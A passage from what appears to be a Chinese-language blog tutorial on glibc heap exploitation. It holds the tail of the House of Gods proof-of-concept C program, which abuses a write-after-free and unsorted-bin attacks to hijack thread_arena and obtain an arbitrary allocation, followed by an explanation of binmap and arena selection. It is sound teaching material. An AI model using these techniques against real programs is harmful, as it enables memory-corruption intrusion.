  * */</span></span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our 0x90-sized smallchunk. We will bin this chunk to forge a\n&quot;</span>, SMALLCHUNK);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake sizefield for our binmap-chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our first fastchunk. Its size is 0x20.\n\n&quot;</span>, FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our second fastchunk with a size of 0x40. The usecase of\n&quot;</span>, FAST40);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;both fastchunks will be explained later in this PoC.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can move our smallchunk to the unsorted bin by simply free&#x27;ing it...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is a great opportunity to simulate a</span></span><br><span class="line"><span class="comment">     * libc leak. We just read the address of the</span></span><br><span class="line"><span class="comment">     * unsorted bin and save it for later.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span>*) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And now we need to make a request for a chunk which can not be serviced by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;our recently free&#x27;d smallchunk. Thus, we will make a request for a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0xa0-sized chunk - let us call this chunk INTM (intermediate).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * following allocation will trigger a binning</span></span><br><span class="line"><span class="comment">     * process within the unsorted bin and move</span></span><br><span class="line"><span class="comment">     * SMALLCHUNK to the 0x90-smallbin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our smallchunk should be now in the 0x90-smallbin. This process also triggered\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the mark_bin(m, i) macro within the malloc source code. If you inspect the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main_arena&#x27;s binmap located at offset 0x855, you will notice that the initial\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value of the binmap changed from 0x0 to 0x200 - which can be used as a valid\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizefield to bypass the unsorted bin checks.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We would also need a valid bk pointer in order to bypass the partial unlinking\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procedure within the unsorted bin. But luckily, the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 points initially to the start of the main_arena itself. This fact\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;makes it possible to pass the partial unlinking without segfaulting.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So now that we have crafted our binmap-chunk, it is time to allocate it\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;from the unsorted bin. For that, we will abuse a write-after-free bug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;on an unsorted chunk. Let us start...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First, allocate another smallchunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * recycle our previously binned smallchunk.</span></span><br><span class="line"><span class="comment">     * Note that, it is not neccessary to recycle this</span></span><br><span class="line"><span class="comment">     * chunk. I am doing it only to keep the heap layout</span></span><br><span class="line"><span class="comment">     * small and compact.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and now move our new chunk to the unsorted bin...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...in order to tamper with the free&#x27;d chunk&#x27;s bk pointer.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bug: a single write-after-free bug on an</span></span><br><span class="line"><span class="comment">     * unsorted chunk is enough to initiate the</span></span><br><span class="line"><span class="comment">     * House of Gods technique.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Great. We have redirected the unsorted bin to our binmap-chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;But we also have corrupted the bin. Let&#x27;s fix this, by redirecting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a second time.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The next chunk (head-&gt;bk-&gt;bk-&gt;bk) in the unsorted bin is located at the start\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point to another allocated chunk (INTM) by writing to its bk pointer before\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;actually free&#x27;ing it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * before free&#x27;ing those chunks, let us write</span></span><br><span class="line"><span class="comment">     * the address of another chunk to the currently</span></span><br><span class="line"><span class="comment">     * unused bk pointer of FAST40. We can reuse</span></span><br><span class="line"><span class="comment">     * the previously requested INTM chunk for that.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Free&#x27;ing FAST40 wont reset the bk pointer, thus</span></span><br><span class="line"><span class="comment">     * we can let it point to an allocated chunk while</span></span><br><span class="line"><span class="comment">     * having it stored in one of the fastbins.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The reason behind this, is the simple fact that</span></span><br><span class="line"><span class="comment">     * we will need to perform an unsorted bin attack later.</span></span><br><span class="line"><span class="comment">     * And we can not request a 0x40-chunk to trigger the</span></span><br><span class="line"><span class="comment">     * partial unlinking, since a 0x40 request will be serviced</span></span><br><span class="line"><span class="comment">     * from the fastbins instead of the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and now free the 0x20-chunk in order to forge a sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and the 0x40-chunk in order to forge a bk pointer.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay. The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The binmap attack is nearly done. The only thing left to do, is\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to make a request for a size that matches the binmap-chunk&#x27;s sizefield.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * all the hard work finally pays off...we can</span></span><br><span class="line"><span class="comment">     * now allocate the binmap-chunk from the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After allocating the binmap-chunk, the unsorted bin should look similar to this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And that is a binmap attack. We&#x27;ve successfully gained control over a small\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number of fields within the main-arena. Two of them are crucial for\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the House of Gods technique\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.next\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.system_mem\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;By tampering with the main_arena.next field, we can manipulate the arena&#x27;s\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;linked list and insert the address of a fake arena. Once this is done,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;we can trigger two calls to malloc&#x27;s reused_arena() function.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The purpose of the reused_arena() function is to return a non-corrupted,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;non-locked arena from the arena linked list in case that the current\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arena could not handle previous allocation request.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The first call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the current main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The second call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the previously injected fake arena (main_arena.next).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can reach the reused_arena() if we meet following conditions\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - exceeding the total amount of arenas a process can have.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      malloc keeps track by using the narenas variable as\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      an arena counter. If this counter exceeds the limit (narenas_limit),\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      it will start to reuse existing arenas from the arena list instead\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      of creating new ones. Luckily, we can set narenas to a very large\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      value by performing an unsorted bin attack against it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - force the malloc algorithm to ditch the current arena.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      When malloc notices a failure it will start a second allocation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      attempt with a different arena. We can mimic an allocation failure by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let us start with the unsorted bin attack. We load the address of narenas\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;minus 0x10 into the bk pointer of the currently allocated INTM chunk...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set INTM&#x27;s bk to narenas-0x10. This will</span></span><br><span class="line"><span class="comment">     * be our target for the unsorted bin attack.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and then manipulate the main_arena.system_mem field in order to pass the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size sanity checks for the chunk overlapping the main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this way we can abuse a heap pointer</span></span><br><span class="line"><span class="comment">     * as a valid sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM -&gt; narenas-0x10\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk      bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can now trigger the unsorted bin attack by requesting the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;INTM chunk as an exact fit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * request the INTM chunk from the unsorted bin</span></span><br><span class="line"><span class="comment">     * in order to trigger a partial unlinking between</span></span><br><span class="line"><span class="comment">     * head and narenas-0x10.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Perfect. narenas is now set to the address of the unsorted bin&#x27;s head\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which should be large enough to exceed the existing arena limit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s proceed with the manipulation of the main_arena.next pointer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;within our previously allocated binmap-chunk. The address we write\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to this field will become the future value of thread_arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set main_arena.next to an arbitrary address. The</span></span><br><span class="line"><span class="comment">     * next two calls to malloc will overwrite thread_arena</span></span><br><span class="line"><span class="comment">     * with the same address. I&#x27;ll reuse INTM as fake arena.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Note, that INTM is not suitable as fake arena but</span></span><br><span class="line"><span class="comment">     * nevertheless, it is an easy way to demonstrate that</span></span><br><span class="line"><span class="comment">     * we are able to set thread_arena to an arbitrary address.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done. Now all what&#x27;s left to do is to trigger two calls to the reused_arena()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function by making two requests for an invalid chunksize.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the first call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address of</span></span><br><span class="line"><span class="comment">     * the current main-arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the second call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address stored</span></span><br><span class="line"><span class="comment">     * in main_arena.next - our fake arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We did it. We hijacked the thread_arena symbol and from now on memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;requests will be serviced by our fake arena. Let&#x27;s check this out\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;by allocating a fakechunk on the stack from one of the fastbins\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of our new fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * construct a 0x70-fakechunk on the stack...</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">uint64_t</span> fakechunk[<span class="number">4</span>] = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="number">0x0000000000000000</span>, <span class="number">0x0000000000000073</span>,</span><br><span class="line">        <span class="number">0x4141414141414141</span>, <span class="number">0x0000000000000000</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ...and place it in the 0x70-fastbin of our fake arena</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x20</span>)) = (<span class="type">uint64_t</span>) (fakechunk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fakechunk in position at stack address %p\n&quot;</span>, fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target data within the fakechunk at address %p\n&quot;</span>, &amp;fakechunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Its current value is %#lx\n\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And after requesting a 0x70-chunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * use the fake arena to perform arbitrary allocations</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...malloc returns us the fakechunk at %p\n\n&quot;</span>, FAKECHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overwriting the newly allocated chunk changes the target\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data as well: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * overwriting the target data</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAKECHUNK)) = <span class="number">0x4242424242424242</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * confirm success</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">assert</span>(fakechunk[<span class="number">2</span>] == <span class="number">0x4242424242424242</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>先了解一下 <code>binmap</code> 的用处。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>binmap</code> 在 <code>malloc</code> 过程中的下面两个场景会被修改：</p>
<ol>
<li>在遍历 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 时如果将该 <code>chunk</code> 放入对应的 <code>small bin</code> 或 <code>large bin</code> 中会在 <code>binmap</code> 对应位置置位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mark_bin</span>(av, victim_index); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>在遍历 <code>small bin + large bin</code> 找大小不小于当前 <code>chunk</code> 的空闲 <code>chunk</code> 时如果对应 <code>binmap</code> 置位的 <code>bin</code> 是空闲的就将对应位置复位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">av-&gt;binmap[block] = map &amp;= ~bit;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-18"><a href="#调试-18" class="headerlink" title="调试"></a>调试</h3><p>首先申请依次申请 <code>SMALLCHUNK_0x90, FASTCHUNK_0x20, FASTCHUNK_0x40</code>，然后将 <code>SMALLCHUNK_0x90</code> 释放到 <code>unsorted bin</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027200937204.png"
                      alt="image-20231027200937204"
                ></p>
<p>然后申请 <code>SMALLCHUNK_0xa0(INTM)</code>，这时候会触发第一个改变 <code>binmap</code> 的条件，会将 <code>binmap[0]</code> 改为 <code>0x200</code>，我们将其作为<code>fake_chunk_size</code>，暂且叫包含 <code>binmap</code> 的 <code>fake_chunk</code> 叫 <code>BINMAP</code>。并将 <code>SMALLCHUNK_0x90</code> 放进 <code>small_bin_0x90</code> 的位置上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201346420.png"
                      alt="image-20231027201346420"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201322231.png"
                      alt="image-20231027201322231"
                ></p>
<p>然后重新申请 <code>SMALLCHUNK_0x90</code>，再将其释放到 <code>unsorted_bin</code> 中。利用 <code>UAF</code> 漏洞将其 <code>SMALLCHUNK_0x90.bk-&gt;&amp;main_arena.bins[253]</code>，也就是 <code>fake_chunk_prevsize</code>。 再将 <code>FASTCHUNK_0x40.bk-&gt;(SMALLCHUNK_0xa0)INTM</code>，然后释放 <code>FASTBIN_0x20, FASTBIN_0x40</code>。其中 <code>FASTBIN_0x20</code> 正好位于 <code>main_arena_size</code>  的位置，其作用是确保 <code>main_arena</code> 所在的 <code>fake chunk</code> 的 <code>size</code> 大于 <code>2 * SIZE_SZ</code> 此时 <code>unsorted bin</code> 结构如下。</p>
<p><em>(因为 <code>binmap</code> 数组是 <code>uint</code> 类型是 <code>4</code> 字节大小，所以 <code>fake_chunk_binmap.bk == next</code> ，<code>next</code> 指针指向 <code>&amp;main_arena</code>)</em></p>
<p><code>head.bk -&gt; SMALLCHUNK_0x90.bk -&gt; BINMAP.bk -&gt; main-arena.bk -&gt; FASTCHUNK_0x40.bk -&gt; INTM</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027202331065.png"
                      alt="image-20231027202331065"
                ></p>
<p>此时申请 <code>0x1f8</code> 大小的 <code>chunk</code> 将会把正好合适的 <code>BINMAP</code> 申请出来。之后我们考虑通过如何把 <code>arena</code> 切换到 伪造的 <code>arena</code> 上。在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code> 来获取 <code>arena</code> 。由于 <code>arena</code> 的 <code>flags</code> 的值一般为 <code>0</code> ，因此将宏展开后发现实际上是获取的 <code>thread_arena</code> 的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get</code> 获取 <code>arena</code> 后会调用 <code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code> 返回 <code>NULL</code> 则调用 <code>arena_get_retry</code> 和 <code>_int_malloc</code> 尝试再次分配内存。</p>
